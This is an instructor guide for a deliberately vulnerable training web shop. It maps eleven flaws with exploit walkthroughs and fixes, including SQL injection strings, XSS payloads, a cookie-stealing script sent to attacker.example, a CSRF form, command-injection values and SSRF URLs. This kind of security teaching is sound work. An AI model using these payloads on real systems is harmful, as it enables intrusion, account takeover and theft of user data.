# INSTRUCTOR GUIDE — SECRET, do not share with students before their attempt

Full vulnerability map for NouriSec VulnerShop: exact location, why it's vulnerable, a sample
exploitation walkthrough, and the correct remediation for each. Cross-reference with
`STUDENT_LAB.md` (student-facing, hints only) and `REPORT_TEMPLATE.md` (what a good finding
write-up should look like).

Every vuln is also marked at its exact line with a `// VULN: <name> (WSTG-ID)` comment in the
source.

---

## 1. SQL Injection — Easy — WSTG-INPV-05 — OWASP A03:2021

**Location:** [`app/auth.py`](app/auth.py) `login()`; [`app/shop.py`](app/shop.py) `search()`.

**Root cause:** both build SQL with plain string concatenation instead of parameterized
queries.

```python
query = "SELECT * FROM users WHERE username = '" + username + "' AND password_hash = '" + password_hash + "'"
```

**Exploit — auth bypass:**
Username: `' OR '1'='1' --`, any password → logs in as the first row in `users` (the seeded
`admin` account, id 1).

**Exploit — UNION-based extraction via search:**
The search query is `SELECT id, name, description, price, image FROM products WHERE name LIKE
'%<q>%' OR description LIKE '%<q>%'` (5 columns). The `users` table also has 5 relevant columns
(`id, username, password_hash, email, avatar`), by design, so:

```
q = ' UNION SELECT id, username, password_hash, email, avatar FROM users --
```

dumps every username + MD5 password hash onto the search-results page (crackable per finding
#9 below — try `hashcat -m 0` or CrackStation on the hashes).

**Fix:** parameterized queries everywhere:

```python
user = db.execute(
    "SELECT * FROM users WHERE username = ? AND password_hash = ?",
    (username, password_hash),
).fetchone()
```

---

## 2. Reflected XSS — Easy — WSTG-INPV-01 — OWASP A03:2021

**Location:** [`app/templates/search.html`](app/templates/search.html), line rendering
`{{ query|safe }}`; `query` comes straight from `request.args.get("q")` in `app/shop.py`.

**Exploit:** `GET /search?q=<script>alert(document.cookie)</script>` executes in the victim's
browser if they click a crafted link.

**Fix:** remove the `|safe` filter — Jinja2 autoescapes by default, so simply rendering
`{{ query }}` is sufficient. Never use `|safe` (or `Markup()`) on untrusted input.

---

## 3. Stored XSS — Medium — WSTG-INPV-02 — OWASP A03:2021

**Location:** [`app/reviews.py`](app/reviews.py) `add_review()` stores `body` raw;
[`app/templates/product.html`](app/templates/product.html) renders `{{ review['body']|safe }}`.

**Exploit:** post a review containing `<script>document.location='https://attacker.example/?c='+document.cookie</script>`
(replace with a benign in-lab callback for demo purposes) — it fires for every visitor to that
product page afterward, including an admin.

**Fix:** drop `|safe`; if HTML formatting in reviews is genuinely wanted, sanitize server-side
with an allow-list library (e.g. `bleach.clean(body, tags=[...])`) before storing or rendering.

---

## 4. Broken Access Control / IDOR — Medium — WSTG-ATHZ-01/04 — OWASP A01:2021

**Location:**
- [`app/account.py`](app/account.py) `profile(user_id)` and `order_detail(order_id)` — fetch by
  ID with no check that the record belongs to `session["user_id"]`.
- [`app/admin.py`](app/admin.py) `_admin_required()` — checks only `"user_id" in session`,
  never `session["role"] == "admin"`. Every `/admin/*` route uses this same broken check, and
  the admin panel is never linked from the customer-facing UI.

**Exploit:**
- Log in as `bob`, visit `/orders/1` (belongs to `alice`) or `/profile/1` (the `admin` account)
  — full read access to another user's data.
- Log in as any customer, visit `/admin` directly — full admin dashboard, user list (including
  password hashes), all orders, product management, and the ping/fetch-image/reset tools.

**Fix:** check ownership on every direct-object route, and check role on every admin route:

```python
order = get_order(order_id)
if not order or order["user_id"] != session["user_id"]:
    abort(404)
```

```python
def _admin_required():
    return session.get("role") == "admin"
```

---

## 5. Broken Authentication — Easy/Medium — WSTG-ATHN-02/03/04/07 — OWASP A07:2021

**Location:** [`app/auth.py`](app/auth.py) `register()`, `login()`, `forgot_password()`;
`/dev/last-reset` in [`app/__init__.py`](app/__init__.py).

**Root causes, each independently exploitable:**
- `register()` has no password length/complexity check — `"a"` is a valid password.
- `login()` has no rate limiting or lockout — unlimited brute-force attempts.
- `admin`/`admin123` is a predictable, documented default credential pair.
- `forgot_password()` generates the reset token as `md5(f"reset-{username}")` — deterministic
  and guessable from the username alone, not a random signed value, and it never expires.
- `/dev/last-reset` is a debug leftover that displays the most recently generated reset link
  for **any** user to **anyone** who requests the URL, with no auth check at all.

**Exploit:** request `/forgot-password` for `alice`, then hit `/dev/last-reset` (no login
needed) to read the live reset link and take over her account. Or just precompute
`md5("reset-alice")` yourself without ever triggering the flow.

**Fix:**
- Enforce a real password policy (length + complexity) in `register()`.
- Add rate limiting/lockout on `login()` (e.g. Flask-Limiter, exponential backoff per IP+username).
- Generate reset tokens with `secrets.token_urlsafe(32)`, store an expiry (e.g. 30 minutes), and
  invalidate after first use.
- Delete `/dev/last-reset` entirely; actually send the email instead of storing it in a global.

---

## 6. Security Misconfiguration — Easy — WSTG-CONF-01/02/03/06 — OWASP A05:2021

**Location:**
- `DEBUG = True` in [`app/config.py`](app/config.py) → full Werkzeug stack traces on any
  unhandled exception, e.g. `GET /product/abc` (non-numeric ID passed straight to `int()`).
- `/.git/HEAD` and `/.git/config` in [`app/__init__.py`](app/__init__.py) — simulated exposed
  VCS metadata (a real deployment mistake when `.git` ships inside the web root).
- `/backup/app_backup.sql` — an old DB dump left in a web-accessible path, containing the
  `svc_backup` account's MD5 hash (chains into finding #9 and #1's UNION dump).
- `/uploads/` — directory listing enabled (`uploads_listing()` in `app/__init__.py`), so every
  uploaded avatar/image is enumerable without needing to guess filenames.
- Default admin creds (see #5).

**Fix:** `DEBUG = False` in any non-local deployment (use a generic 500 page); never serve
`.git` or backup files from the web root (deny via server config or simply don't put them
there); disable directory listing (don't hand-roll a listing route; serve only known filenames);
rotate/remove default credentials before any shared use.

---

## 7. CSRF — Medium — WSTG-SESS-05 — OWASP A01:2021

**Location:** [`app/account.py`](app/account.py) `change_email()` and `change_password()` —
plain `POST` handlers with no CSRF token, no re-authentication (no "current password" check),
and no Origin/Referer validation.

**Exploit:** while a victim is logged in, get them to load an attacker page containing:

```html
<form action="http://127.0.0.1:5000/account/change-password" method="POST" id="f">
  <input name="password" value="pwned123">
</form>
<script>document.getElementById('f').submit()</script>
```

Their session cookie rides along automatically; their password is silently changed to one the
attacker knows — full account takeover, no XSS required.

**Fix:** use Flask-WTF's `CSRFProtect` (or a hand-rolled per-session token checked on every
state-changing POST), and require the current password before accepting a new one.

---

## 8. Insecure File Upload — Medium/Hard — WSTG-BUSL-09 — OWASP A04:2021

**Location:** [`app/uploads.py`](app/uploads.py) `_extension_allowed()` / `upload_avatar()`.

**Root cause:** the allow-list checks only the file's extension (not magic bytes/content), and
the allow-list itself includes `svg`. An uploaded SVG can carry an embedded `<script>`, and
browsers render SVG as a mini-document (not just a raster image) when it's opened directly —
so navigating to `/uploads/<uploaded-file>.svg` executes the script in the uploads origin.

**Exploit:** upload a file named `evil.svg` containing:

```xml
<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.cookie)</script></svg>
```

then open `/uploads/<stored-name>` directly.

(Note: because Flask's static file server never executes server-side code regardless of
extension, a classic "upload a `.php` webshell" RCE is **not** reproducible here by design —
the taught impact is stored-XSS-via-upload and defacement, not remote code execution.)

**Fix:** validate content (e.g. `Pillow.Image.open().verify()` for raster formats, reject SVG
entirely or sanitize it), generate a random server-side filename with no user-controlled
extension trust, and serve uploads from a separate origin/subdomain with `Content-Disposition:
attachment` so they can never execute in the app's own origin.

---

## 9. Sensitive Data Exposure — Easy — WSTG-CRYP-04 — OWASP A02:2021

**Location:**
- [`app/models.py`](app/models.py) `hash_password()` — unsalted MD5.
- [`app/config.py`](app/config.py) `SECRET_KEY = "supersecret123"` — hardcoded, weak, guessable
  (also signs Flask's session cookie — a stronger attack chain is: guess/crack this, then forge
  admin sessions).
- [`app/static/js/main.js`](app/static/js/main.js) — a fake payment-gateway API key left in a
  comment, visible to anyone viewing page source.
- [`backup/app_backup.sql`](backup/app_backup.sql) — leaks the `svc_backup` MD5 hash directly
  (crackable: MD5 of `password123`, present in any standard wordlist/rainbow table).

**Fix:** hash passwords with `bcrypt`/`argon2` (salted, slow by design); generate `SECRET_KEY`
randomly per deployment (`secrets.token_hex(32)`) and load it from an environment variable/secret
store, never commit it; never place API keys or secrets in client-side JS; keep backups out of
any web-accessible path and off any host the app itself serves from.

---

## 10. Command Injection — Hard (advanced) — admin "ping" tool — OWASP A03:2021

**Location:** [`app/admin.py`](app/admin.py) `ping()`.

**Root cause:** `subprocess.run("ping -c 1 " + host, shell=True, ...)` — the `host` form field
is concatenated directly into a shell command string.

**Exploit:** `host = 127.0.0.1; id` (or `` `id` ``, or `$(id)`) runs a second command inside the
container.

**Safety note:** this is only safe to demonstrate on the isolated Docker network shipped with
this repo (`internal: true` in `docker-compose.yml` — see README). On that network the injected
command can only affect the sandboxed container itself, never a real external host. Do not run
this module outside Docker on a machine you care about.

**Fix:** never use `shell=True` with user input. Validate `host` against a strict allow-list
(e.g. `^[a-zA-Z0-9.\-]+$`) and pass arguments as a list, no shell:

```python
import re, subprocess
if not re.fullmatch(r"[a-zA-Z0-9.\-]{1,253}", host):
    abort(400)
subprocess.run(["ping", "-c", "1", host], capture_output=True, text=True, timeout=5)
```

---

## 11. SSRF — Hard (advanced) — admin "fetch product image by URL" — OWASP A10:2021

**Location:** [`app/admin.py`](app/admin.py) `fetch_image()`.

**Root cause:** `requests.get(url, timeout=5)` with a fully attacker-controlled `url` and no
scheme/host allow-list or deny-list for internal ranges.

**Exploit:** `url = http://127.0.0.1:5000/admin/users` fetches the (HTML) admin user list
server-side and saves it as an "image" — demonstrating that the server can be made to reach
internal-only endpoints on the attacker's behalf. In a real deployment this same bug class
reaches cloud metadata endpoints, internal admin APIs, etc.

**Safety note:** same as #10 — only demonstrate this on the isolated Docker network shipped
here, so it cannot be used to reach real third-party hosts.

**Fix:** allow-list acceptable schemes (`https` only) and validate the resolved IP is not in any
private/loopback/link-local range (RFC 1918, `127.0.0.0/8`, `169.254.0.0/16`, etc.) *after* DNS
resolution (to prevent DNS-rebinding bypasses), or better: don't let the server fetch arbitrary
URLs at all — have the client upload the image directly.

---

## Chained finding worth calling out to students

`/backup/app_backup.sql` (misconfig, #6) leaks `svc_backup`'s MD5 hash (weak crypto, #9), which
is crackable to `password123`, and `svc_backup` is a real, currently-valid admin account (#4/#5)
— a clean example of how a "low" misconfiguration finding combines with other lows into a
critical path to full admin access. Worth highlighting in the report template's risk-rating
discussion.
